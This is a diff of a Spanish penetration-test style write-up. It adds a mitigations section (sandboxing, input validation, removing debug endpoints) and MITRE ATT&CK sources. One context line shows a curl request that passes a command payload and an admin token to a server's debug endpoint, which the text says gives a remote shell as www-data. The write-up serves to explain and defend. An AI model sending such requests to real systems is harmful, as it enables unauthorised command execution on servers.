@@ -122,7 +122,17 @@ curl "10.1.0.8:5042/api/debug?cmd=$PAYLOAD&token=$ADMIN_TOKEN"
 
 Con esto obtenemos una shell remota con el usuario dueño del proceso del servidor **www-data**.
 
-### Mitigaciones
+## Mitigaciones
+- [M1048 -  Application Isolation and Sandboxing](https://attack.mitre.org/mitigations/M1048/)
 
-### Fuentes
-- [T1083 - File and Directory Discovery](https://attack.mitre.org/techniques/T1083/)
+Para mitigar la ejecución de código remota, se puede **aislar** la aplicación con superficie de ataque para que no tenga acceso directo al servidor.
+- Mitigación para el acceso local de archivos.
+
+Desde el servidor, impedir el pase de input de usuario directo desde cliente hasta el sistema de archivos local, como mínimo sin una validación previa en el servidor web.
+- [M1042 - Disable or Remove Feature or Program](https://attack.mitre.org/mitigations/M1042/)
+
+Eliminado (o restricción de acceso) de endpoints y códigos de debug innecesarios.
+
+## Fuentes
+- [https://attack.mitre.org/techniques/T1083/](https://attack.mitre.org/techniques/T1083/)
+- [https://attack.mitre.org/techniques/T1059/004/](https://attack.mitre.org/techniques/T1059/004/)
